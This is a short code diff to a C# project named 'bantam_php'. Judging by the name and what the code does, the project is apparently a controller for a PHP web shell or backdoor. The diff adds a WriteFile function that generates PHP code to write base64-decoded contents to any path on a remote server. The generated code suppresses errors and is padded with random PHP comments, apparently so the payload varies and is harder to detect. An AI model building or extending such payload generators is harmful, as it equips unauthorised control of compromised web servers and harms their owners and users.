@@ -353,6 +353,20 @@ namespace bantam_php
         }
 
         /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="remoteFileLocation"></param>
+        /// <param name="b64FileContents"></param>
+        /// <returns></returns>
+        public static string WriteFile(string remoteFileLocation, string b64FileContents)
+        {
+            string phpCode = RandomPHPComment()
+                           + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'));"
+                           + RandomPHPComment();
+            return phpCode;
+        }
+
+        /// <summary>
         /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
         /// </summary>
         /// <param name="code"></param>
